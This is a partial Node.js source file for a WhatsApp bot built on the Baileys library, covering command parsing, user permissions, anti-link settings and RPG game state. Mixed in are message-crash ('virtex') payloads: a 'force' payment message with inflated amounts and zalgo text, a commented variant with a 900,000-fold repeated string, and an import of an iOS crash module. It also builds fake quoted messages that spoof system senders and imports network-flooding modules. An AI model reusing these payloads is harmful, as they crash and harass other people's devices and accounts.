/*
> Created By King Sam

*/

require('./config')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
//=================================================//
const { ryozingodConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
//=================================================//
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
//=================================================//
// Disini Ada Beberapa Modul Yg Udh kg gw Pake, lu Hapus Sendiri Aj 🚬🗿
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const jimp = require('jimp')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { remini } = require('./lib/remini')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const fs = require('fs')
//=================================================//
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./lib/premiun')
let afk = require("./lib/afk") //afk

//=================================================//
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.kuismath = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakkalimat = db.data.game.tebakkalimat = []
let tebaklirik = db.data.game.tebaklirik = []
let tebaktebakan = db.data.game.tebaktebakan = []
let tebakbendera = db.data.game.tebakbendera = []
let tebakbendera2 = db.data.game.tebakbendera2 = []
let tebakkabupaten = db.data.game.tebakkabupaten = []
let tebakkimia = db.data.game.tebakkimia = []
let tebakasahotak = db.data.game.tebakasahotak = []
let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
let tebaksusunkata = db.data.game.tebaksusunkata = []
let tebaktekateki = db.data.game.tebaktekateki = []
let _afk = JSON.parse(fs.readFileSync('./dtbs/afk-user.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./dtbs/enable/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./dtbs/enable/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./dtbs/enable/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./dtbs/enable/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytvideo.json'))

//=================================================//
module.exports = ryozingod = async (ryozingod, m, chatUpdate, store) => {
try {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
''
);

//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
//const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
//const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await ryozingod.decodeJid(ryozingod.user.id)
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
const iniseller = JSON.parse(fs.readFileSync('./dtbs/seller.json'))
const contacts = JSON.parse(fs.readFileSync("./dtbs/contacts.json"))
const isContacts = contacts.includes(m.sender)
const author = `\x32\x33\x34\x38\x31\x36\x34\x37\x34\x37\x35\x33\x34`
const isReseller = [author,botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDeveloper = [author,botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
const isAfkOn = afk.checkAfkUser(m.sender, _afk)    

// Group
const groupMetadata = m.isGroup ? await ryozingod.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false

//=================================================//
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = db.data.users[m.sender]
if (typeof user !== 'object') db.data.users[m.sender] = {}
const chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {
}
if (user) {
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 30000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0
}
//=================================================//
const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
//    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: false,
//    		auto_ai_grup: true,
//    		goodbye: true,
    		onlygrub: false,
//        welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }

} catch (err) {
console.error(err)
}
//=================================================//
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll.jpg`)
const mengkece = fs.readFileSync(`./image/nulll.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
//=================================================//
const { dafontSearch, dafontDown } = require('./lib/dafont.js')
const scp1 = require('./lib/scraper.js') 
const ffstalk = require('./lib/ffstalk.js')
const githubstalk = require('./lib/githubstalk.js')
const npmstalk = require('./lib/npmstalk.js')
const mlstalk = require('./lib/mlstalk.js')
const textpro = require('./lib/textpro.js')
const photooxy = require('./lib/photooxy.js')
//=================================================//
const { ios } = require("./virtex/ios.js")
//=================================================//
if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await ryozingod.readMessages([readkey]);
}
ryozingod.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
ryozingod.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
ryozingod.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await ryozingod.updateProfileStatus(`✳️ SpiderV600 -  By : Taira Makino || ✅ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}

/*let rn = ['composing','recording','paused']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
ryozingod.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//

//=================================================//
//=================================================//
//Push Kintil
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//=================================================//
//Ini Waktu | Waktu adalah emas,maka dari itu sentuh lah rumput.dan jangan nolep dikamar terus,usahakan tu kontol jangan dikocok terus.Lutut ama sikut lu kopong nanti
const moment = require('moment-timezone');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Good Morning"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄 Selamat Sore"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️ Selamat Siang"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️ Selamat Pagi"
} else {
ucapanWaktu = "🌆 Selamat Subuh"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
//=================================================//
// Badwords
const badwords = JSON.parse(fs.readFileSync('./src/badwords.json'))
const addbadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./src/badwords.json'))
badwords.push(kata)
fs.writeFileSync('./src/badwords.json',JSON.stringify(badwords))
joreply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletebadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./src/badwords.json'))
badwords=badwords.filter(word=>word!==kata)
fs.writeFileSync('./src/badwords.json',JSON.stringify(badwords))
joreply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//=================================================//
//Status
if (!ryozingod.public) {
if (!m.key.fromMe) return
} 
//=================================================//

async function loading () {
var gen2 = [
"▶︎ •━━━━━━━━‌‌‌‌‌• 00:00",
" ꠰꠰︎ •၊၊၊|။•‌‌‌‌‌၊|၊|။|။‌‌‌‌‌၊|၊၊|။||||။‌‌‌‌‌• 00:10",
" ꠰꠰︎ •━|။|‌‌‌‌‌၊|၊|•|။‌‌‌‌‌၊|||။||||။‌‌‌‌‌• 00:50",
" ꠰꠰︎ •၊|━|‌‌‌‌‌၊|၊|။||‌‌‌‌‌၊|၊၊|•|၊||။‌‌‌‌‌• 01:35",
" ꠰꠰︎ •━━‌━၊||━၊|━|━|||‌‌‌‌‌• 01:58",
"Loading Selesai..."
]
let { key } = await ryozingod.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await ryozingod.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}

//=================================================//





/*const force = {
  "key": {
    "remoteJid": "status@broadcast",
    "participant": "0@s.whatsapp.net",
    "fromMe": false
  },
  "message": {
  "interactiveMessage": {
    "header": {
      "title": ""
    },
    "body": {
      "text": "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"
    },
    "footer": {
      "text": "By - Ryozingod"
    },
    "nativeFlowMessage": {
      "messageParamsJson": "".repeat(900000)
    }
  }
}
}*/


const force = {
  key: {
    participant: `0@s.whatsapp.net`,
    ...(m.chat ? {
      remoteJid: "status@broadcast"
    } : {})
  },
  'message': {
    "interactiveMessage": {
      "header": {
        "hasMediaAttachment": true,
        "jpegThumbnail": fs.readFileSync(`./image/latx.png`)
      },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "review_and_pay",
            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
      }
    }
  }
}




//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 𝖘𝖕𝖎𝖉𝖊𝖗 - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Taira Makino`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'Taira - Makino',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` Spider V600 \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `Spider V600`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `Spider V600`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
